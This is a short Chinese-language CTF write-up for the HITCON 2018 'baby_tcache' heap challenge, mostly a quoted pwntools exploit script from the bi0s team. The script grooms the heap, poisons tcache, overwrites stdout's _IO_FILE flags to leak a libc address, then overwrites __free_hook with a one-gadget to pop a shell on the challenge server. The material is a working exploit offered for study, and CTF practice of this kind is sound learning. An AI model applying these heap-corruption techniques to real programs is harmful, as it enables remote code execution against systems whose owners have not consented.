# HITCON2018 baby_tcache
## Wenhuo

&nbsp;&nbsp;&nbsp;&nbsp;<font size=2>同样也是经典的tcache题，难点在于无法用常规题的show来leak出数据，这里我参考了[bi0s队伍](https://vigneshsrao.github.io/babytcache/)的writeup,利用了_IO_FILE结构的stdout中的_IO_write_ptr-_IO_write_base来扩大输出的范围，从而leak出可以用来计算libc_base的数据达到目的。</font></br>
&nbsp;&nbsp;&nbsp;&nbsp;<font size=2>引用一下大佬们的writeup:</font></br>

引用自bi0s
======

```python
from pwn import *
import sys

HOST='52.68.236.186'
PORT=56746

#context.terminal=['tmux', 'splitw', '-h']
#context.terminal = ['urxvtc', '-e', 'sh', '-c']

if len(sys.argv)>1:
    r=remote(HOST,PORT)
else:
    r=process('./baby_tcache',env={"LD_PRELOAD":"./libc.so.6"})
    context.log_level='debug'
    gdb.attach(r)

libc=ELF("./libc.so.6")

def menu(opt):
    r.sendlineafter("Your choice: ",str(opt))

def alloc(size,data='a'):
    menu(1)
    r.sendlineafter("Size:",str(size))
    r.sendafter("Data:",data)

def delete(idx):
    menu(2)
    r.sendlineafter("Index:",str(idx))

def getleak():
    alloc(0x500-0x8)  # 0
    alloc(0x30)   # 1
    alloc(0x40)  # 2
    alloc(0x50)  # 3
    alloc(0x60)  # 4
    alloc(0x500-0x8)  # 5
    alloc(0x70)  # 6
    delete(4)
    alloc(0x68,'A'*0x60+'\x60\x06')  # set the prev size
    delete(2)
    delete(0)
    delete(5)  # backward coeleacsing
    alloc(0x500-0x9+0x34)
    delete(4)
    alloc(0xa8,'\x60\xc7')  # corrupt the fd of the tcache-fastbin
    alloc(0x40,'a')
    #gdb.attach(r,'''b*0x0000555555554D21\nb*_IO_file_seek''')
    alloc(0x3e,p64(0xfbad1800)+p64(0)*3+'\x00')  # overwrite the file-structure
    r.recv(8)
    libc.address=u64(r.recv(8))-0x3ed8b0
    log.info("libc @ "+hex(libc.address))
    alloc(0xa8,p64(libc.symbols['__free_hook'])) # corrupt twice
    alloc(0x60,"A")
    alloc(0x60,p64(libc.address+0x4f322)) # one gadget with $rsp+0x40 = NULL
    delete(0)

    r.interactive()


if __name__=='__main__':

    getleak()

```